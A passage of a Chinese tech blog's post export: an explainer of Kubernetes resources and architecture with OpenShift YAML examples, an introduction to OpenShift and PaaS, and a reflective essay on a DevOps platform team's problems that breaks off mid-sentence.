基于容器引入了许多重要的概念，了解这些概念有助于认知 Kubernetes 是如何工作的。以下介绍均为 Kubernetes 中被定义的资源，Kubernetes 架构按照 Restful 架构设计，即遵循： 网络上的所有事物都被抽象为资源 每个资源对应一个唯一的资源标识符 通过通用的连接器接口对资源进行操作 对资源的各种操作不会改变资源标识符 所有操作都是无状态的 REST是基于HTTP的 PS：REST之所以可以提高系统的可伸缩性，就是因为他要求所有的操作都是无状态的。 Pod 名词释义Pod 意为豆荚，内涵多个共享网络和存储的容器，作为被Replication Controller, Label, Service操作的逻辑对象，是Kubernetes里能被创建、调度和管理的最小部署单元。可以想象成一个用于装 Container 的篮子： 一个 Pod 里能装多少资源取决于篮子的大小 Label 是贴在篮子上的 IP 分配给篮子而不是容器，篮子里的所有容器共享这个 IP 哪怕只有一个容器，Kubernetes仍然会给它分配一个 Pod，Pod里的Container数量也可以为零 Pod 的运行状态：Pending、Running、Succeeded、Failed Pod中的容器共享了IP及其对应的namespace, Volume；从 Linux 的 namespace 的角度看，Pod 里的容器还共享了 PID, IPC(信号量、消息队列、共享内存)，UTS(主机名与域名) namespacePod 是为了解决“如何合理使用容器支撑企业级复杂应用”的问题而诞生的，Kubernetes 的设计理念是为了支持绝大多数应用的原生形态，而不是大谈特谈“轻应用”和“十二要素应用”；Pod 对于 Kubernetes 来说最有用的价值就是“原子化调度”，即在为一个 Pod 选择目的宿主机时，Kubernetes 会先考量这个机器是否能放下整个 Pod，而避免出现本应该部署在一起的容器因为资源不足无法满足“超亲密关系”的尴尬。Pod 里面包含一个网络容器先于其他所有容器创建，拥有该 Pod 的 namespace。用户可以使用 rsh 命令登录到一个 Pod 里，原理是在 Pod 里创建了一个 bash Container。 Pod 是如何被定义的我们来看 Openshift 的一个 template 是如何描述一个 Pod 对象的： # Kuberntes 是按照 Restful 标准设计，所以你能在每个资源对象中看到 API Version apiVersion: v1 # 申明一个 Pod 类型 kind: Pod metadata: # 具有严格命名规范的注释，包含版本号，资源url，团队名等 annotations: { ... } # 每个 Pod 需绑定一个或多个 Tag，方便 Replication Controller 和 Service 对 Pod 进行调度和管理 labels: deployment: docker-registry-1 deploymentconfig: docker-registry docker-registry: default generateName: docker-registry-1- spec: # 下面是对 Pod 中 Container 的定义，Containers 为一个列表，可以配置不同类型的多个 Contianer containers: # Container 中被注入的环境变量 - env: - name: OPENSHIFT_CA_DATA value: ... - name: OPENSHIFT_CERT_DATA value: ... - name: OPENSHIFT_INSECURE value: &quot;false&quot; - name: OPENSHIFT_KEY_DATA value: ... - name: OPENSHIFT_MASTER value: https://master.example.com:8443 # Container 由哪个 image 启动 image: openshift/origin-docker-registry:v0.6.2 imagePullPolicy: IfNotPresent name: registry ports: # 决定了 Pod 暴露出来的端口 - containerPort: 5000 protocol: TCP resources: {} securityContext: { ... } # 决定了将被挂载到 Pod 里的外部存储设备挂载到 Container 的哪一个路径 volumeMounts: - mountPath: /registry name: registry-storage - mountPath: /var/run/secrets/kubernetes.io/serviceaccount name: default-token-br6yz readOnly: true dnsPolicy: ClusterFirst imagePullSecrets: - name: default-dockercfg-at06w restartPolicy: Always serviceAccount: default # 将外部存储设备挂在到 Pod 中，此处为一个临时存储，和一个加密存储 volumes: - emptyDir: {} name: registry-storage - name: default-token-br6yz secret: secretName: default-token-br6yz 关于 VolumeVolume 是 Pod 中能被多个容器访问的共享目录，生命周期和 Pod 相同，如果有数据持久化考虑，如数据库的数据 Volume，通常需要调用云基础设施的持久化存储服务，如 AWS 的 EBS，EFS 等。 EmptyDir: 在 Pod 被分配到 Node 时创建，初始内容为空，Pod 被移除时 EmptyDir 中的数据也会永久删除；常用于临时共享目录 hostPath: 在 Pod 上挂载宿主机上的文件或目录；使用时要注意 Pod 会在不同 Node 上漂移的问题，可以用在比如 Redis 集群的数据卷 NFS EBS 创建一个 EBS Volume，直接挂载到 Pod 里 gitRepo: 挂载一个空目录，并下载一个 git repository … 关于 Label 和 Label Selector Label：Replication Controller 和 Service 通过 Label 对 Pod 进行选择和调度，Kubernetes 引入 Label 主要是为了面向用户，包含对象功能性和特征性描述的 Label 比对象名和 UUID 更加用户友好和有意义，而且使用户可以以一种松耦合的方式实现自身组织结构到系统对象之间的映射，无需客户端存储这些映射关系。 Label Selector：是 Kubernetes 核心的分组机制，用于让客户端识别一组有共同特征或属性的 Kubernetes 对象，这一特性促进了扁平化、多维度的服务组织和部署架构，这对集群管理（譬如配置和部署）和应用的自我检查分析（日志监控预警分析）非常有用。Label Selector 除了严格匹配还支持类似于 SQL WHERE 语句的查询。 Replication Controller 名词释义Replication Controller 的作用是决定一个Pod在运行时同时有多少个副本，类似于 AWS 的 Auto Scaling Group，方法是在每一个 Pod 外挂了一个控制器进程，与 Pod 相互独立，避免造成性能瓶颈或挂掉影响 Pod。Replication Controller 是 Kubernetes 为了解决“如何构造完全同质的 Pod 副本”的问题而引入的资源对象。其配置文件由三部分组成：一个用于创建 Pod 的 template，一个期望的副本数，和一个用于选择被控制的 Pod 集合的 Label Selector。Replication Controller 会不断地监测控制的 Pod 集合数量并与期望的副本数量进行比较，根据实际情况进行创建和删除 Pod 操作。功能：弹性伸缩，灰度发布（需要两个 Replication Controller ）。 Replication Controller 是如何被定义的同样我们来看一个 Replication Controller 的配置文件： apiVersion: v1 kind: ReplicationController metadata: name: frontend-1 spec: # 描述这个 rc 中期望的同质 Container 的数量 replicas: 1 # Label Selecter 用于匹配期望的 Pod，以及给新创建的 Pod 打上标签 selector: name: frontend # 模板，用于定义 Pod template: metadata: labels: name: frontend spec: containers: - image: openshift/hello-openshift name: helloworld ports: - containerPort: 8080 protocol: TCP restartPolicy: Always Service 名词释义由于重新调度等原因，Pod 在 Kubernetes 里的 IP 并不是固定的，因此需要一个代理来确保需要使用 Pod 的应用不需要知道 Pod 的真实 IP 地址，同时 Service 还为多个 Pod 副本提供负载均衡，可以类比 AWS 中的 ELB。Service 由两部分构成，一个与 Service 生命周期相同的 IP 地址，和一个 Label selector；另外还需要配置转发端口 ，Service 对象创建后系统会创建一个同名 Endpoints 对象用于保存匹配 Label selector 后端 Pod 的 IP 地址和端口。Service 可以置空 Label selector 用于代理非 Pod，或得不到 Label 资源的（遗留）系统。方法：通过在 Service 里定义端口转发，再在 Endpoints 中自定义IP和端口。Service 提供外部访问服务有三种形式，利用 Kubernetest 集群 IP 池（由 Administrator 配置）；利用宿主机（Node）的 IP 和端口；利用 LoadBalancer(如 AWS 的 ELB)。另外，Service 是支持黏滞会话的。 Service 是如何被定义的来看一个 Service 的配置文件： apiVersion: v1 kind: Service metadata: name: docker-registry spec: # Label Selector selector: docker-registry: default # Endpoint，可以用于代理内部/外部资源（需使用 ”ExternalIPs“） portalIP: 172.30.136.123 ports: - nodePort: 0 port: 5000 protocol: TCP targetPort: 5000 Service ProxyService Proxy（Kube-proxy）负责在 Service 建立的时候在宿主机上随机监听端口并建立 Iptable 规则进行转发，同时 Kube-proxy 还会实时监测 Kubernetes 的 Master 节点上的 etcd 中 Service 和 Endpoints 对象的增加和删除信息，从而保证和后端 Pod 的 IP 和端口变化保持一致更新。Service discovering：环境变量（ Pod 创建时被注入所有可用 Service 环境变量形如 XXX_SERVICE_HOST=10.0.0.1）或通过 DNS（skyDNS服务器），调用 Kubernetes 的 WatchAPI, 不间断地监测新 Service 的创建并未每个 Service 新建一个 DNS 记录，在整个集群范围可用，在同 namespace 下的 Service 通过二级域名(Myservice)访问该 Service, 不同 namespace 下则可通过 my service.mynamespace 的方式访问到。DNS 的方式因为存在 TTL 导致服务 DNS 记录更新不及时而存在争议。对于一部分要求外网可访问的 Service，可以通过 createExternalLoadBalancer=true（利用IaaS平台）或者维护一个 PublicIPs 池，利用 Kube-proxy 转发的方式实现。 健康检查既然 Service 可以路由，必然也有对 Pod 进行健康检查的功能： 进程级别由 Kubelete 通过 Docker daemon 获取所有 Docker 进程的运行状态，如果某容器进程未正常运行则重启。 应用级别由Kubelete在容器内执行活性探针（liveness probe），支持 HTTP get, Container exec, TCP Socket 三种检查方式，默认情况确认失败会删除 Pod, 另外还有一个可选项是 readiness probe，即仅移除 Endpoint，这样保留Pod可以用于错误重现。 Pod + RC + Service上面提到的 Pod，Replication Controller，Service 三种资源构成了 Kubernetes 集群中最常见的一种应用架构，如下图所示。 这个架构是不是很熟悉？没错，他和 AWS 里 Instance + Autoscaling Group + ELB 的架构是样的，如果你你对 AWS 的服务熟悉的话，可以据此来理解应用在 Kubernetes 里的架构： Pods - Instances Replication Controllers - Auto Scaling Services - Elastic Load Balancing Nodes - Availability Zone Kubernetes 架构Kubernetes 的架构如下图所示，对于学习 Openshift 这部分内容仅作兴趣了解即可，PaaS 平台的存在就是为了屏蔽掉这些底层细节。 APIServer:运行在 Master 节点，对外作为系统管理指令的统一入口，任何对资源进行的增删改查都要交给 APIServer 处理后才能提交给 etcd。（etcd 是一个键值对数据库，是 APIServer 的唯一持久化节点） API Server 分为只读端口（Kubernetes-ro service, port:7080）和读写端口(Kubernetes service port:6443)，基于 etcd 实现了一整套 RESTful API 用于操作存储在 etcd 中的 Kubernetes 对象实例，APIServer 借助一个被称为 registry 的实体来完成对etcd的所有操作。 Scheduler根据特定的调度算法将 pod 调度到指定的 Node(早期也被叫做minion） 上，也叫绑定。工作节点描述方式：期望状态（由 Json 描述），当前状态，包括：HostIP，Node Phase（Pending, Running, Terminated）, Node Condition(NodeReady)，由 controller manager 下属的 node controller 循环检查 Node 中的 minion 进程获得。 调度算法：Predicates（能不能-端口是否冲突、资源是否够用、Volume 是否有冲突、NodeSelector 是否选中（label selector的一种）、HostName 指定 Node）; Priorities（资源占用比小、Pod数量少、平等对待每个 Node (默认情况不使用)） Controller manager运行在 master 上的一个基于 Pod API 的独立服务，重点实现了 service endpoint 的动态更新，管理 kubernetes 集群中的各种控制器（replication controller, node controller,..），用于确保资源保持在预期状态。 Replication controller:每五秒执行一次检查，将返回的健康pod数量和描述文件中定义的数量做个 diff，再根据结果调用 APIServer 执行新建或删除 Service endpoint controller: 每十秒执行一次检查，遍历集群中所有 namespace 下 service 对象，取到 service 的 label selector 获取 service 对应的后端 Pod 对象列表，将 Pod 和 Service 的详细信息以 Pod 为单位封装成一个个 Endpoint 对象，这就是实际的 Endpoint 对象；用于和 APIService 在 etcd 中检索到的 Endpoint 期望状态进行比较, 在根据 etcd 中的期望调用 APIServer 创建或销毁资源。 Node controller: 判断是否工作在 IaaS 上，是则直接掉 IaaS API 获取所有可工作节点；定期向 APIServer 注册以此工作节点；每隔五秒 pull 一次 Node 中 kubelet 发送过来的工作节点运行状态，retry 超过30秒无响应设置 node 状态为 Unknow，然后，调用 APIServer 更新 etcd 中的节点信息，如果时间超过 PodTvictionTimeout，则在 etcd 中删除所有 Pod 对象。 Resource quota controller: 用于追踪集群资源配额的实际使用量，期望值由管理员静态设置。 KubeletKubelet 是运行在 Kubernetes 集群中子节点上的进程，负责管理和维护 Node 上的所有容器。Kubelete 利用 Dokcer cAdvisor 进程用于监控 Node 的状态并将数据汇报给 master。垃圾回收： 容器回收（goroutine 每一分钟调用 Docker 客户端过滤出停止且超过 MinAge 的容器以 Pod 为单位放到 EvictUnit 中，判断宿主机允许回收，则删除）。镜像回收（每五分钟遍历一次，筛选出最长时间没有被使用且大于指定时间的 Image 删除）同步工作节点。 Kube-proxyKube-proxy 既支持 HTTP，也支持 TCP 和 UDP 连接，默认情况下提供 Round Robin 算法将客户端流量复杂均衡到 Service 对应的一组后端 Pod，最重要的是 Kube-proxy 还支持 Session Affinity(Session Sticky，会话黏滞)。而服务发现上，Kube-proxy 使用 etcd 的 Watch 机制，监控集群 Service 和 Endpoint 对象数据的动态变化，并且维护一个从 Service 到 Endpoint 的映射关系，从而保证了后端 Pod 的 IP 变化不会对访问者造成影响。 核心组件协作流程费心巴力在网上找了描述准确的图但是他每个对象都少了最后一个字母，更正如下，从左到右：Kubectl APIServer etcd Scheduler Kubelet Docker 创建Pod示意图 参考资料： 《Dokcer 容器与容器云》浙江大学 SEL 实验室著 《Kubernetes权威指南》龚正，吴治辉，王伟 等著 https://www.slideshare.net/imesh/revolutionizing-wso2-paas-with-kubernetes-app-factory https://docs.openshift.org/latest/architecture/core_concepts/index.html https://kubernetesbyexample.com/ https://kubernetes.io/docs/concepts/","tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"PaaS","slug":"PaaS","permalink":"https://www.duyidong.com/tags/PaaS/"},{"name":"Openshift","slug":"Openshift","permalink":"https://www.duyidong.com/tags/Openshift/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://www.duyidong.com/tags/Kubernetes/"},{"name":"平台即服务","slug":"平台即服务","permalink":"https://www.duyidong.com/tags/平台即服务/"}]},{"title":"PaaS 平台（一） -- Openshift 介绍","date":"2017-06-14T13:53:00.000Z","path":"2017/06/14/kubernetes-and-openshift/","text":"Openshift 是一个基于 Kubernetes 和 Docker 的 PaaS 平台。 历史背景容器和容器云的历史如下图所示，我整理了一个简单的容器历史年表，蓝色箭头表示容器的发展史，红色箭头表示 Openshift 重大事件。在 2013年以前，容器还是 OpenVZ，LXC 等虚拟化技术的形态，在 2013年3月，Docker 正式发布开源版本，随即在 Github 中代码提交量盛况空前，打响了容器化技术的第一枪。在 Docker 发布之后短短数月的时间，Redhat 就开始了基于 Docker 的 PaaS 平台研发(官网标注是在13年6月 Openshift 就已经在基于 Kubernetes 研发)，并在随后发布的 REHL6.5 中集成了对 Docker的支持，标拉开了业界各大厂商竞相支持 Docker 的序幕。次年，云计算三巨头亚马逊、微软、谷歌相继推出了支持 Docker 的云计算品台。2015年7月，谷歌发布了 Kubernetes 的第一个版本，Kubernetes 脱胎于谷歌内部的大规模集群管理工具 Borg，且参与 Kubernetes 项目的早期贡献者正式参与过 Borg 项目的工程师，所以业界基本认同 Kubernetes 的很多概念和架构“代表了谷歌过去十余年设计、构建和管理大规模容器集群经验”的说法。虽然 Kubernest 在容器调度方面表现出众，但他的功能还元不构成一个 PaaS 平台，于是很多厂商开始基于 Kubernetes 开发自己的 PaaS 平台，其中就有目前在国内创业公司被大量使用的 Rancher，值得注意的是 Rancher 是在2016年才开始发布第一个版本，而 Openshift 则早在13年就开始基于 Kubernetes 的开发，但目前看来国内市场对 Ranchard 的接受度是远高于 Openshift 的，就使用体验上看，Rancher 也确实更简单易用。今年（2017年）四月份发生了一件引爆容器社区的事，就是 Docker 开源社区版改名为 Moby，此举为 Docker 公司的商业行为，在此不表态，不赘述。截止到这边文章发出为止，目前 Moby 的最新版本为 17.3.2(Docker 的版本从1.2之后变更了命名方式直接跳到了17)，Kubernetes 为1.7.0(基本与 Docker 更新保持同步) ，Openshift 则为 3.6.0。 这里要说明一下 Openshift 目前有四个版本，分别为公有云版（类似于AWS）、企业版、企业定制版（保证专属硬件）、社区版本，笔者试用版本为社区版。社区版中有一个分支应用叫 minishift，是一个基于虚拟机的单节点 Openshift 集群，基本和公有云版功能一致，在 16G 的 Mac 上跑起来完全无压力。但还是更推荐直接使用oc cluster up，用容器的方式启动更简单也更轻量，也是目前官方推荐的做法。 图片来源：https://docs.openshift.com/ 什么是 PaaSPaaS（Platform as a Service，平台即服务）最早是在云计算领域被提出。如下图所示，将企业IT服务分为九层，传统自建数据中心九层设施都需要企业自己维护，成本极高。而云计算架构就相当于吧九层架构中的底层一部分外包给云计算服务提供商，根据外包的层次不同，分为IaaS(Infrastructure as a Service，基础设施即服务)，PaaS，SaaS（Software as a Service）三层。 IaaS 层为基础设施运维人员服务、提供计算、存储、网络以及其他硬件资源，云平台使用者可以在上面部署和运行包括操作系统和应用程序在内的任意软件，无需再为基础设施的管理而分心。 PaaS 层为应用开发人员服务，提供支撑应用运行所需的软件运行时环境，相关的工具与服务，如数据库服务、日志服务、监控服务等，让应用开发者可以专注于交付业务价值的代码而无需关心应用所需脚手架。 SaaS 层为一般用户（最终用户）服务，提供了一套完整可用的软件系统，让一般用户无需关心技术细节，只需通过浏览器、应用客户端的方式就能使用部署在云上的应用服务。SaaS 产品比如客户关系管理系统、邮件、虚拟桌面、通信、游戏等。 图片来源：https://mycloudblog7.wordpress.com/2013/06/19/who-manages-cloud-iaas-paas-and-saas-services/ 这里要更正一个误区，有人可能认为 AWS 是一个 PaaS 服务，那我的项目全部都在 AWS 上，我是不是就已经有了一个 PaaS 平台？答案是否定的。在一些 AWS 的使用场景中，租户往往只是用了它的 IaaS 级服务，比如 EC2 instance，出于也无需要或灵活性的考虑，租户需要自己管理操作系统以上的环境，诸如安装 Tomcat, Apache 等服务，这些工作由一些自动化脚本来完成。除此之外你或许还有一套搭建在 Jenkins 上的持续交付系统，有一个搭建在 Nexus 服务器上的版本管理系统，这些所有目前由你自己管理的组件，才真正构成了一个 PaaS 平台。企业在自己管理 PaaS 平台的时候是会有很多痛点的，比如跨云环境不兼容各云平台厂商的基础设施，比如持续集成服务器不稳定，比如自动化配置脚本难管理。如此种种，给企业数字化平台的管理造成成本，平台成为承载业务的开发的瓶颈，企业产生了选用一套第三方 PaaS 平台的需求，这也是为什么今天我们来讲 Openshift。 Openshift 对比 Cloud FoundryCloud Foundry 是一个常被用于和 Openshift 对比的产品，前者由 Pivotal 公司开发(大名鼎鼎的 Springboot，SpringCloud就是他们家的)，后者由 Redhat 开发。很难用一两句话说清两个 PaaS 孰优孰劣，但就我个人的使用体验而言，Cloud Foundry 自动化程度更高一些，而 Openshift 可定制化程度也更高，Openshift 上的应用甚至不需要是一个严格的十二因素应用，这也就意味着可以将任何类型的应用迁移到 Openshift 上。 Openshift 架构概览Openshift 实际上由三部分组成，核心部分实现容器的调度是封装的 Kubernetes， 除此之外还有一个内置的镜像仓库（Image Registry），这个仓库是可选的，Openshift 也可以配置使用 Dockerhub 或者企业自己的镜像仓库，最外层部分是一个友好的 Web 界面，用于展示和操作 Openshift 的资源。如下图所示，Openshift 要成为一个完整的数字化平台需要依赖于两个外部系统，一个代码库，一个是持续集成服务，事实上这两个外部服务也是可以跑在 Openshift 里面的。右边的灰色矩形就是 Openshift 的主要架构了，它的上层是一个路由（Router），用于 DNS 解析和转发，确保用户能够调用到 Openshift 集群中的服务。红色的部分是跑在 RHEL 操作系统上的 Kubernetes 集群，侧面是外部存储服务，因为集群里的计算单元是漂浮的，所以通常 Kubernetes 集群只提供计算能力，数据持久外需要依赖外部的比如说 S3，EBS 等云服务商提供的存储服务。最下层同样也是由云服务商提供的基础设施服务。 以上为 Openshift 的一个简单的认识，下一部分我会讲解 Kubernetes 引入的一些新概念，这些概念在 Openshift 中也被复用到，理解这些概念有助于理解 Openshift 的架构和流程设计。 参考资料：《Dokcer 容器与容器云》浙江大学 SEL 实验室著","tags":[{"name":"DevOps","slug":"DevOps","permalink":"https://www.duyidong.com/tags/DevOps/"},{"name":"PaaS","slug":"PaaS","permalink":"https://www.duyidong.com/tags/PaaS/"},{"name":"Openshift","slug":"Openshift","permalink":"https://www.duyidong.com/tags/Openshift/"},{"name":"Kubernetes","slug":"Kubernetes","permalink":"https://www.duyidong.com/tags/Kubernetes/"},{"name":"平台即服务","slug":"平台即服务","permalink":"https://www.duyidong.com/tags/平台即服务/"}]},{"title":"DevOps 团队交付了什么？","date":"2017-06-08T08:38:47.000Z","path":"2017/06/08/work-in-blackops/","text":"大熊最近在 ThoughtWorks 给大家讲数字平台战略(Digital Platform Strategy)，非常高兴向大家地宣布，我们已经有了战略框架，鼓励项目上的同事多讲讲故事，那我就来讲一个。借此对过去5个月在项目上的磕磕绊绊做个整理。 背景介绍客户是一家澳洲大型金融保险企业，在保险领域处于本地绝对领先地位，其IT部门总人数在千人以上，维护应用两百余个。在经历了几年的收购和合并之后，在业务上指定了将收购来的多个品牌进行整合的大方针，于是IT部门也开始面临着系统整合，业务线整合，网站合并的问题，同时客户正在将他们的服务逐渐从自建数据中心向 AWS 公有云服务上迁移。 团队概览在数字化转型的漫漫长路中，该企业已经在内部搭建起了一套持续交付系统，以Jenkins为中心，有制品库，依赖管理，代码管理，任务管理系统，敏捷实践成熟。 我所在的团队是在整个组织向 DevOps 转型中的一个比较关键的团队，肩负着 CI/CD 优化、持续交付改进、运维能力输出的重任。类似的团队应该在很多 DevOps 转型的组织里都有，负责维护 CI/CD 基础设施，搭建应用开发脚手架，维护基础设施变更，做各种自动化的工作（姑且就将这类团队称之为 Platform 团队）。比较特殊的是我在的这个团队实行轮岗制，由产品团队的成员（通常是开发）定期轮换到 Platform 团队，带着在产品团队遇到但是没能解决的问题，在这个团队寻求最佳实践和解决方案，一段时间后（通常是三个月），开发从 Platform 团队回到开发团队，同时将 DevOps 技能和最佳实践待到产品开发团队。整个 Platform 团队大小基本维持在3-5人，有一个 IM（Iteration Manager 迭代经理），其余全是 Dev (Developer 开发)。 取得的成就回顾过去的五个月，Platform 团队一共经历了10个迭代（每个迭代两个星期），我梳理了一下每个迭代的工作内容，整理出主要成就如下： 围绕 CI/CD 做了很多优化，比如简化 Jenkins slave 创建流程，给自动化脚本（基础设施代码）贡献了许多新功能。 新技术试点，比如尝试用将静态文件部署到 AWS S3 中代替 Apache 服务。 为应用设置监控，更新了基础设施脚本用于开启监控，并协助应用团队将配置脚本应用到各个环境。 团队之间的沟通，了解开发团队痛点，帮助开发团队找到能够解决问题的团队（权限，责任划分，知识传递），技能培训等。 响应变化，解决技术难题（虽然我认为更多的还是一个沟通+权限的问题，但是其他所有团队都认为是技术难题那我也就这样认为吧），以及修复一些类似于硬盘空间已满，网络延迟，权限的的问题。 遇到的问题当然在交付价值的同时有很多痛点是非常痛的： 权限，作为一个和各个开发团队沟通的团队，不但没有比开发团队更多的权限，甚至连开发团队的一些权限都没有，比如不能向开发团队的代码库 Push 代码(修改基础设施代码需要这个权限)，比如 Linux 底层问题没法直接修复，因为只有应用级别的权限，再比如 Jenkins 没有服务器权限，出了问题也不能修，因为这些应用是由别的团队专门管理。 沟通，为了解决一个 bug，有时候要花上两周的时间发邮件，找关键人物，组织会议，跟不同的人解释五遍以上的上下文（技术细节的上下文是很繁琐的），最后解决问题的人还很有可能不是自己团队的（没有权限）。因为大家平时都很忙，而且建卡工作的方式让一部分人对团队请求帮助的问题不是很热心，这种情况在沟通的时候如果表现得情商不够高对方就会要你发邮件给他们团队然后等 IM 建卡，规划到迭代里再说了，我遇到过一次这样的情况，最后还是通过社工手段拿下了这个关键人物，过程不可谓不曲折。 需求，Platform 团队并不交付业务价值，因此没有 BA(Business analyst 业务分析师，通常扮演梳理需求的角色)，建卡的事基本都由 IM 和 Dev 来做，虽然感觉上是合理的，但实施起来却遇到很多问题，究其根本就是因为对需求的定义和划分不够明确，往往导致最后挪卡的时候大家都说不准这张卡算不算完成了，只能用拍脑袋的方式来决定。 质量，同上，团队缺少QA(Quality Assurance，质量工程师，测试人员)，Dev 们都是自己做卡自己测，有时候会结对测试，但也会因为对需求理解不充分，或者说拆卡拆得有问题，导致一些卡完成得质量不够，直接影响受依赖的卡。举个例子，部署监控需要自动化脚本的两个模块支持，两个模块被分为两张卡，在做第一张卡的时候遇到了诸多问题，好不容易把代码 Push 到别人的版本库里了，在做第二张卡的时候却发现第一张卡代码里多写了一对引号，导致整个逻辑实现失败，这个时候再回过头来改之前的代码，又要重新解决之前遇到的各种问题（沟通、权限，PS：这个时候做第一张卡的人还下了项目），周期和浪费的工时是可想而知的。 轮岗，这是 IM 一直很头疼的一件事，Platform 团队大量的时间花在给新来的团队成员输入上下文，同时又有成员离开团队要交接工作，尤其在沟通重要的工作中，成员的离开意味着需要新的人重新和干系人建立联系，再者，一些成员因为项目上的痛点，不是很有心思工作在团队的事务上，而是更关心自己过段时间会被分配到那个团队，如此种种都对团队的价值交付造成了很大的困扰。举一个例子，有一个端到端测试工具一直由 Platform 团队维护，从我加入 Platform 团队开始，这个测试工具就打算新增一个集成远程浏览器引擎的功能，这是一个非常有价值的功能，因为开发团队长期苦于浏览器版本支持过少，端到端测试不稳定；但是在实现过程中一直存在一个网络问题，这张卡先后被关闭，开启，标记完成，又重新开启，经历了大概五六个人的手，困扰我们的网络问题直到 Platform 团队解散，都没能解决。 汇报，虽说 ThoughtWorks 是扁平化管理，但是面对一个金字塔结构的客户难免也会需要固定有资深的人和客户的高层对接，这种安排是合理且必要的；在交付团队中，开发如果发现资源不足，需要和 TL(Tech Lead 或是 Team Lead，可以理解为项目组长)或者 PM(Production Manager 产品经理)沟通，但是在 Platform 团队，没有合适的汇报对象，一方面在 ThoughtWorks 内部没有工作关系紧密的架构师或者 TL，另一方面客户的汇报线变动频繁，也就是客户的领导也在变，在团队成员缺少资源需要更高管理层的决策支持时沟通难度增加。比如在申请权限时需要客户领导审批，客户的领导却一直在会议中，要么就找不到人（海外项目远程办公，只能通过及时通讯软件呼叫客户），让在团队中别的客户成员帮忙跟进，客户也是无奈地摊摊手，一次又一次在站会中重复着“他很忙，我找不到他”，诸如此类。同样，没有合适的汇报人意味着团队缺少了更高的视角来实时回顾自己做的事情是否是正确的，方向有没有走偏，或者是不是又在造别人造过的轮子。我在团队解散后跟“前” IM 聊天，他还坚持认为我们团队被解散是因为没有一个强有力的领导在背后支持，这也从侧面反映了我们没有找到合适的汇报人，告诉他，我们在做什么，听他说，我们下一步可以做什么。 分析问题背后的原因及可能的改进方案团队解散后经过一段时间的沉淀，也和过往的成员逐一了解了他们的想法，总结分析出了以下原因，以及可能的解决方案能使做得更好。 原因1：团队方向不清晰不同于交付业务价值的产品团队，Platform 团队不对某一个具体的产品负责，也不直接产出业务价值，所以这个团队应该是属于架构师的一个机动团队，因此客户的架构师的离开，就为 Platform 团队解散埋下了伏笔。（这一点我也是后来才意识到的）可能的改进方案：在团队利益相关者(Stakeholder)缺失的时候，应立即与我方架构师沟通，在明确团队方向的同时还能发挥 ThoughtWorks 影响力。 原因2：团队角色缺失在架构师不能全权参与团队工作的情况下（甚至 Platform 团队还一度没有 IM ），一帮 Dev 就很容易对团队整体整体的感知，每个 Dev 只关心自己手里的工作，迭代开始初期容易考虑不到全局影响不能准确建卡，迭代进行时因为没有合适的汇报人因而跨团队交流困难，迭代结束时没有优质的回顾。在 Micromanagement culture（微观管理文化）中有一个 Alignment(校准)和 Autonomy(自治)两个互斥的指标，我们使用这两个指标作为向量构成四个象限，如下图所示，高校准低自治的团队由领导决定做什么以及怎么做，团队只需要执行，这样会形成“领导说什么就是什么”的局面；而高校准且高自治的团队是由领导指出要解决的问题以及原因，然后由团队成员相互合作共同找到问题的解决方案；低校准低自治的团队则缺乏活力，只能循规蹈矩；而高自治低校准的团队成员可以坐任何他们想做的事情，领导则很无助因为没有人关心真正需要的解决的问题。在敏捷团队中，如果只剩下了 Dev，情形则很有可能变成图中左下象限（也有些许右下）的情况，要想达到右上象限的期望状态，需要提高自治，更多的是校准。可能的改进方案：在意识到这个问题的时候，团队需要一个关键人物出面充当领导者的角色，扮演这个角色的人必须关注在团队交付价值，目标和方向，并且有强大的沟通能力让团队成目标一致；和利益相关者加强沟通，保证团队方向不会跑偏。 图片来源：Spotify Engineering Culture 根本原因Platform 团队成立初期被定义为一个立意高远（DevOps 转型）的组织，但是在项目实施过程中变得越来越边缘化，其中有“人”的原因，有组织架构的原因，当然还有一些客观原因。但我突然意识到这背后有一个原因一直被我忽视了，那就是————我们在实践 DevOps 反模式。 国内近年来一直在对 DevOps 如何落地争论不休，DevOps 提倡的是打破开发和运维的部门墙，将开发和运维（的能力）放在一个团队。然而国内大部分项目的现状是，开发不具备运维技能和意识，也不愿意做“背锅侠”（要求开发做运维一定程度上牺牲了开发的利益，比如亚马逊的开发会隔周会被要求24小时 On-call），因此一些公司选择了在项目中先成立一个 “DevOps 团队” 作为过渡，再慢慢将 CI/CD 的理念和技能扩散到其他团队，但是这种方式稍不注意就会变成“换了个名字的 Ops ”，因为工作内容相似，写脚本，做高可用，这些是传统运维也会做的事情，这种形式非常不利于团队思维的转变，“对最终交付物负责”才是 DevOps 的精要，而不是职责划分（只对流程负责）。这样的要求无异是给项目成员增加了工作量和责任，对他们提出了更高的要求。然而很多职员不愿意无回报地多背负一些责任，比如说开发，谁不愿意每天写点代码一提交就早早回家，DevOps 要求他们得看着新功能上线，确保无误之后才能离开；所以 DevOps 的推行在产品团队中是有阻力的，因此，DevOps 应该是场自上而下的运动。 反思 做一个项目要有一个项目的收获，不然工作十年你只拥有了十年的工作经历，而不是十年的工作经验。 ———— 朱平 尽早找到关系人，并和他建立联系。 这一点是我觉得最需要反省的，在项目进行到7、8个迭代的时候才意识到要和我方架构师和技术专家建立联系，在此之前走了很多弯路，也错失了很多机会。 让事情发生比如何发生更重要。 应该说在这5个月的工作中，我最喜欢的部分是最后两个迭代我们开始真正搜集来自应用团队的需求，开始在两地组织各个团队的 TL 开会搜集痛点和解决方案。这件事其实我早就意识到会是非常有价值的，但始终没有去做，总是顾虑不知道怎么去开始，去推动，担心自己表述不清，或者不能给 TL 真正解决问题会很不好意思。但是最后这件事终于发生了，才意识到真的是非常有价值，而且早该这么做了。 关于这点在我还在 ThoughtWorks 试用期的时候我的 Buddy(由公司安排负责伴随新员工过度试用期的人) 给了我一个非常好的建议，就是决定要讲一个分享之前先把日程表（邀请邮件）发出来，这种看似是“Deadline driven(截止日期驱动)”的方式，背后暗含了“这件事情必须发生”的道理，这和 MVP(Minumum viable product，产品原型) 的原理也是一样的，先上线，再搜集反馈，迭代改进；就算它是一个错误的行为，这也是一次有价值的试错。 类似的事情还有很多，比如敢于和客户沟通，敢于在团队承担很多责任，都可以借鉴。 下一步结合我自身的经历，“DevOps 团队”的实践并不是一个很好地工作体验，应用开发团队自身如果不具备产品思维，要由一个独立的团队去影响它们是很难的，这样的实践下的 DevOps 团队就像是披着 DevOps 外衣的 Ops 